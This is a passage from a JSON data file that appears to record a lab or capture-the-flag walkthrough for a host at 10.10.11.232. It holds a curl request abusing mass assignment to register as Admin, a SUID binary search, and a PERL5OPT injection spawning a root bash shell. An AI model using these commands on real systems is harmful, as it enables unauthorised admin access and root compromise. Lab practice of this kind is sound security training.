          ]
        },
        {
          "port": 80,
          "name": "HTTP (PHP App)",
          "version": "",
          "vulnerabilities": [
            {"type": "idor", "summary": "Mass assignment role=Admin in registration/API", "leads_to": "admin"},
            {"type": "rce", "summary": "PHP RCE with admin role", "leads_to": "www-data"}
          ],
          "commands": [
            {"cmd": "curl -X POST http://10.10.11.232/register -d 'user=test&pass=test&role=Admin'", "rationale": "Why: Mass assignment grants admin without auth"},
            "# Or: Burp intercept, add role=Admin parameter"
          ]
        }
      ],
      "privesc": [
        {
          "from": "www-data",
          "to": "root",
          "technique": "SUID binary → PERL5OPT injection",
          "commands": [
            "find / -perm -4000 -type f 2>/dev/null",
            "strings /path/to/suid-binary",
            "# If binary runs perl: PERL5OPT='-e exec\"/bin/bash\"' ./suid-binary",
            {"cmd": "PERL5OPT='-e exec\"/bin/bash -p\"' /path/to/suid-binary", "rationale": "Why: Inject code into perl SUID for root shell"}
          ]
        }
